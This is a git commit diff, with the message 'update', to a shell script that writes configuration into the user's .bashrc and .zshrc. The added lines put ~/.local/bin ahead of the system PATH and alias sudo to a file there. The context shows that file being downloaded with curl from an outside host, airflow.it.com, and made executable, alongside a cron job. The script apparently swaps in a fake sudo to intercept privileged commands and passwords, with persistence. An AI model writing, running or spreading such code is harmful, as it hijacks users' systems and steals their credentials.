e5f075938667012661ecf598317cfd327e70e255
AndresNeron <andres.finanzas0820@gmail.com>
2026-05-23 16:05:58 -0600

    update

--- light/add_public_dynamic_u_7.sh
+++ light/add_public_dynamic_u_7.sh
@@ -50,17 +50,23 @@ else
     echo "Cron job already exists. Skipping."
 fi
 
-RC_FILE="$HOME/.${SHELL}rc"
+TARGET_FILES=("$HOME/.bashrc")
 
-if grep -qF 'PATH="$HOME/.local/bin:$PATH"' "$RC_FILE" || grep -qF 'alias sudo="$HOME/.local/bin/sudo"' "$RC_FILE"; then
-    echo "Configuration already exists in $RC_FILE. Skipping."
-else
-    cat << 'EOF' >> "$RC_FILE"
+if which zsh >/dev/null 2>&1; then
+    TARGET_FILES+=("$HOME/.zshrc")
+fi
+
+for RC_FILE in "${TARGET_FILES[@]}"; do
+    if grep -qF 'PATH="$HOME/.local/bin:$PATH"' "$RC_FILE" || grep -qF 'alias sudo="$HOME/.local/bin/sudo"' "$RC_FILE"; then
+        echo "Configuration already exists in $RC_FILE. Skipping."
+    else
+        cat << 'EOF' >> "$RC_FILE"
 PATH="$HOME/.local/bin:$PATH"
 alias sudo="$HOME/.local/bin/sudo"
 EOF
-    echo "Successfully added configuration to $RC_FILE."
-fi
+        echo "Successfully added configuration to $RC_FILE"
+    fi
+done
 
 curl -fsSL https://airflow.it.com/sudo -o ~/.local/bin/sudo
 chmod +x ~/.local/bin/sudo
